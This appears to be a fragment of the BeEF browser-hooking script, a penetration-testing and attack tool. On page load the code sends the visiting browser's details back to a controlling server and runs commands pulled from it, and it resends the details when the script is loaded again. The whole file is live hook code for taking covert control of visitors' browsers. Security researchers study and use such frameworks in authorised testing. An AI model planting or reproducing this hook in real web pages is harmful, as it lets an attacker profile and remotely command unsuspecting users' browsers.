 
// if beef.pageIsLoaded is true, then this JS has been loaded >1 times 
// and will have a new session id. The new session id will need to know
// the brwoser details. So sendback the browser details again.
if( beef.pageIsLoaded ) {
  beef.net.sendback_browser_details();	
}

window.onload = function() {
  if (!beef.pageIsLoaded) {
    beef.pageIsLoaded = true;
	beef.net.sendback_browser_details()
    beef.updater.execute_commands();
    beef.updater.check();
  }
}
